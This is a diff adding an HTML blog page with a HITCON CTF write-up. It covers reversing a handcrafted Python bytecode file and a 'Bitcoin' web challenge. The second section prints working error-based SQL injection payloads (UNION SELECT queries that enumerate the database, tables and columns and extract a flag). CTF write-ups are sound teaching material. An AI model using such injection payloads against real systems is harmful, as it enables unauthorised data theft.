@@ -1,0 +1,194 @@
+<html>
+ <head>
+<title> Hitcon CTF </title>
+
+ <link rel="stylesheet" type="text/css" href="test1.css" />
+ <link rel="stylesheet" type="text/css" href="fonts.css" />
+</head>
+<style>
+
+      body {background-color:white;
+	border-bottom:1px solid #bfbfbf
+         line-height:1.5em;
+	color:#222}
+ 
+   p{color:black;
+        /*font-style: italic;
+       font-family: "Times New Roman";*/
+      letter-spacing: 2px;
+       font-size: 20px;
+       margin-top: 10px;
+       margin-bottom: 10px;
+        margin-right: 150px;
+       margin-left: 150px; 
+       }
+
+h2{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+
+    h1{ color:black;
+         font-style: italic;
+        font-size:2.2em;
+	font-family:"PT Serif","Georgia","Helvetica Neue",Arial,sans-serif;
+	font-weight:normal;
+	line-height:1.2em;
+	margin-bottom:0.6667em
+        margin-right: 150px;
+       margin-left: 150px;}
+
+code { 
+display: block; white-space: pre-wrap; 
+border: 1px solid #000; 
+padding: 10px; 
+line-height: 1.5em; 
+font-family: "Lucida Console", Monaco, monospace; 
+} 
+.code-str 
+{ color:#ff33d4; } 
+ .code-comment { color:#3c33ff; } 
+ .code-key { color:#9933ff; }
+ .code-brown{color:#ba4a00} 
+
+
+</style>
+<body>
+
+<script src="null.js"></script>
+
+<div style="position: relative; background: url('http://hackerbuck.net23.net/css/bgm.png'); width: 1210px; height: 110px;">
+ <div style="position: absolute; bottom: 0; left: 0.5em; width: 400px; font-weight: bold; color: #fff;">
+ <p style="color:white;font-size:2.2em;"> Blog </p>
+ </div>
+ </div>
+
+
+ <br> <br>  <br>          
+
+<h1 class="post-title"> Hitcon ctf writeup  </h1>
+   
+ <br> 
+
+<h2>1.Handcrafted Pyc</h2>
+
+<p>We were give a python bytcode to reverse .. so i used uncompyl2(/6) but it ddin't worked out..the magic bytes was corrupted so to recover it ..  </p>
+
+<code>
+head -c 8 example.pyc > bytecode.pyc
+cat bytecode >> bytecode.pyc
+</code>
+
+<p>then decompiling it using uncompyl2 gave assembly code instead of py cod coz the entire program was written in assembly .. so we have to manually insect it <br>
+   after read the python assembly doc i wrote a py code to  extract the password ..</p>
+
+<code>
+with open('string','r') as file_obj:
+    	data=file_obj.readlines()
+
+i=0
+stack = []
+print len(data)
+for line in data :
+   print "[+]In loop %d "% i 
+   val=line[16:].split()
+   if i==70:
+     print stack
+   if val[0] == "LOAD_CONST" :
+           i=i+1
+           dat=val[2].split('(')[1].split(')')[0]
+           if dat != 'None' :
+               dat=chr(int(dat))
+               stack.append(dat)
+
+   if val[0] == "ROT_TWO":
+           temp=stack[-2]
+           stack[-2]=stack[-1]
+           stack[-1]=temp
+   if val[0] == "BINARY_ADD":
+           stack[-2]+=stack[-1]
+           stack.pop(-1)
+
+print stack	
+</code>
+<br>
+
+<p>instead of using uncompyl2 we could also use dis module in python to get the assembly below code recursively disassmble the bytecode </p>
+
+<code>
+import dis
+import types
+import marshal, zlib, base64
+
+def get_code_object(obj, compilation_mode="exec"):
+    if isinstance(obj, types.CodeType):
+        return obj
+    elif isinstance(obj, types.FrameType):
+        return obj.f_code
+    elif isinstance(obj, types.FunctionType):
+        return obj.__code__
+    elif isinstance(obj, str):
+        try:
+            return compile(obj, "<string>", compilation_mode)
+        except SyntaxError as error:
+            print "error"
+    else:
+        raise TypeError("get_code_object() can not handle '%s' objects" %
+                        (type(obj).__name__,))
+
+def diss(obj, mode="exec", recurse=False):
+    _visit(obj, dis.dis, mode, recurse)
+
+def ssc(obj, mode="exec", recurse=False):
+    _visit(obj, dis.show_code, mode, recurse)
+
+def _visit(obj, visitor, mode="exec", recurse=False):
+    obj = get_code_object(obj, mode)
+    visitor(obj)
+    if recurse:
+        for constant in obj.co_consts:
+            if type(constant) is type(obj):
+                print()
+                print('recursing into %r:' % (constant,))
+                _visit(constant, visitor, mode, recurse)
+
+codeobj=marshal.loads(zlib.decompress(base64.b64decode('eJyNVkt....')
+diss(codeobj,"exec",True)
+</code>
+
+<br><br>
+<h2>2. Bitcoin Writeup </h2>
+
+<p>We were given a page which generates a bitcoin and then asks to verify the payment <br>
+  After some time i found tgat its vulnerable to error based sql injection ...</p>
+
+<code>
+
+1NahfkZo5S6JrZxhR2jXWm3nhMBerQRoDU' AND 1=0 UNION ALL SELECT  database() -- '
+
+database() = areyourich
+
+114j4PJhqj6ZihacUx4CQnActDSm9tqpxd'  AND  1=0 union all select  table_name from information_schema.tables   where table_schema=database()  limit 1 -- '
+
+
+table_name = flag1 
+
+select column_name from information_schema.columns where table_name="flag1";
+
+colum_name = flag 
+
+114j4PJhqj6ZihacUx4CQnActDSm9tqpxd'  AND  1=0 union all select flag from areyourich.flag1 limit 1 -- '
+
+gave the flag hitcon{4r3_y0u_r1ch?ju57_buy_7h3_fl4g!!}
+
+</code>
+<p>But to extract 2 flag you have to inject a a bitcoin adress using select .. such that the account has 10000 bitcoins ..</p>
+
+</body>
+</html>
